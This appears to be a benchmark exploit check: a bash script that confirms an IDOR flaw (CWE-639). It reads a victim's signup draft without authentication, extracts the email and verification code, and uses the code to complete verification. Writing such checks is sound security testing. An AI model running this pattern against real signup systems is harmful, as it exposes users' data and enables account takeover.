#!/usr/bin/env bash
# SIGNUP-IDOR-001 (CWE-639): any draft readable by id, unauth, leaks email + code.
set -eu; . "$(dirname "$0")/_lib.sh"
VICTIM="victim-$$@bench.local"
VID=$(curl -s -X POST "$TARGET/api/signup/start" -H 'content-type: application/json' \
  -d "{\"email\":\"$VICTIM\"}" | json_get draftId)
[ -n "$VID" ]
STOLE=$(curl -s "$TARGET/api/signup/draft/$VID")
echo "$STOLE" | grep -q "$VICTIM"
echo "$STOLE" | grep -q '"code"'
CODE=$(echo "$STOLE" | json_get code)
curl -s -X POST "$TARGET/api/signup/verify" -H 'content-type: application/json' \
  -d "{\"draftId\":$VID,\"code\":\"$CODE\"}" | grep -q '"ok":true'
